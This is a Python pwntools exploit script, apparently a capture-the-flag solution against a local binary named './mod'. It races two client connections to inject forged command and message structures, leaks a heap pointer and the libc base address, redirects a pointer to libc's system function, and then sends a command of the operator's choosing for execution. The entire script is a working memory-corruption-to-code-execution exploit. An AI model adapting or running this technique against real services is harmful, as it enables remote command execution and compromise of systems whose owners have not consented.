from pwn import *

io = None
clix = None
cliy = None
libc = ELF('./libc.so.6')
nul_ptr = 0
remote_ip = '127.0.0.1'
port = 0

def craft_fake_cmd(cmd, react_idx, react_content):
    msg = p32(0x1)
    if cmd == 'flush':
        msg += p32(0xDEADC0DE)
        msg += p64(0)
        msg += p64(0)
    elif cmd == 'redact':
        msg += p32(0xCAFEBABE)
        msg += p64(react_idx)
        msg += p64(react_content)
    elif cmd == 'print':
        msg += p32(0xDEADBEEF)
        msg += p64(0)
        msg += p64(0)
    else:
        print('invalid msg')
        exit(0)
    return (len(msg), msg)

def craft_fake_msg(sz, next_ptr):
    msg = p32(0x0)
    msg += p32(sz)
    msg += p64(next_ptr)
    msg += b'duongnh'.ljust(0x40, b'\0')
    msg += b'\0'*sz
    return (len(msg), msg)
    

def client(data):
    global port
    global remote_ip
    name, msg = data
    cli = remote(remote_ip, port)
    cli.sendlineafter(b'destroy?\n', msg)
    cli.sendlineafter(b'purposes!\n', name)
    cli.close()


def race():
    global port
    if port == 0:
        print('init went wrong')
        exit(0)
    
    name = b'duongnh'
    msg = b'\0' * (0x10000-0x50)
    fake_cmd_len, fake_cmd = craft_fake_cmd('print', 0, 0)
    msg += fake_cmd
    fake_cmd_len, fake_cmd = craft_fake_cmd('flush', 0, 0)
    msg += fake_cmd * 11
    clix = threading.Thread(target=client, args=((name, msg),))

    msg = b'y'*(fake_cmd_len * 12 - 0x50)
    cliy = threading.Thread(target=client, args=((name, msg),))

    clix.start()
    #time.sleep(0.0028)
    cliy.start()
    time.sleep(0.4)

def race2():
    global port
    global nul_ptr
    if port == 0:
        print('init went wrong')
        exit(0)
    if nul_ptr == 0:
        print('cant get nul_ptr')
        exit(0)
    
    name = b'duongnh'
    msg = b'\0' * (0x10000-0x50)
    fake_cmd_len, fake_cmd = craft_fake_cmd('flush', 0, 0)
    msg += fake_cmd

    fake_msg_len1, fake_msg = craft_fake_msg(0x30, nul_ptr - 0x100)
    msg += fake_msg

    fake_cmd_len, fake_cmd = craft_fake_cmd('redact', 1, 0)
    msg += fake_cmd

    fake_cmd_len, fake_cmd = craft_fake_cmd('flush', 0, 0)
    msg += fake_cmd

    fake_msg_len2, fake_msg = craft_fake_msg(0x30, nul_ptr - 0x68 - 0x50)
    msg += fake_msg

    fake_cmd_len, fake_cmd = craft_fake_cmd('print', 0, 0)
    msg += fake_cmd

    fake_cmd_len, fake_cmd = craft_fake_cmd('flush', 0, 0)
    msg += fake_cmd

    clix = threading.Thread(target=client, args=((name, msg),))

    msg = b'y'*(fake_cmd_len*5 + fake_msg_len2 + fake_msg_len1 - 0x50)
    cliy = threading.Thread(target=client, args=((name, msg),))

    clix.start()
    #time.sleep(0.0028)
    cliy.start()
    time.sleep(0.4)

def race3():
    global port
    if port == 0:
        print('init went wrong')
        exit(0)
    
    name = b'duongnh'
    msg = b'\0' * (0x10000-0x50)
    fake_cmd_len, fake_cmd = craft_fake_cmd('flush', 0, 0)
    msg += fake_cmd

    fake_msg_len1, fake_msg = craft_fake_msg(0x30, nul_ptr - 0xc0)
    msg += fake_msg

    fake_cmd_len, fake_cmd = craft_fake_cmd('redact', 1, libc.sym['system'])
    msg += fake_cmd

    fake_cmd_len, fake_cmd = craft_fake_cmd('flush', 0, 0)
    msg += fake_cmd

    fake_msg_len2, fake_msg = craft_fake_msg(0x30, nul_ptr - 0x68 - 0x50)
    msg += fake_msg

    fake_cmd_len, fake_cmd = craft_fake_cmd('print', 0, 0)
    msg += fake_cmd

    fake_cmd_len, fake_cmd = craft_fake_cmd('flush', 0, 0)
    msg += fake_cmd

    clix = threading.Thread(target=client, args=((name, msg),))

    msg = b'y'*(fake_cmd_len * 5 + fake_msg_len1 + fake_msg_len2 - 0x50)
    cliy = threading.Thread(target=client, args=((name, msg),))

    clix.start()
    #time.sleep(0.0028)
    cliy.start()
    time.sleep(0.4)

def init():
    global port
    io.recvuntil(b'is ')
    port = int(io.recvline())
    #client((b'duongnh', b'\0'*0x21000))


io = process('./mod')
init()
for i in range(100):
    race()
    x = io.recv()
    if b'0x' in x:
        x = x[::-1].split()[0][::-1]
        nul_ptr = int(x, 16)
        print(x)
        break

for i in range(100):
    race2()
    x = io.recv()
    if b'0x' in x:
        x = x.split(b'Message ')[2].split(b"'")[1]+b'\0\0'
        libc.address = u64(x)-libc.sym['fork']
        log.info('libc '+hex(libc.address))
        break

for i in range(20):
    race3()
    x = io.recv()
    if b'0x' in x:
        print('insert cmd? ')
        break

cmd = input().encode('utf-8')

client((b'duongnh', cmd))

print(io.recv())
log.info('ggwp: '+io.recv().decode())

io.kill()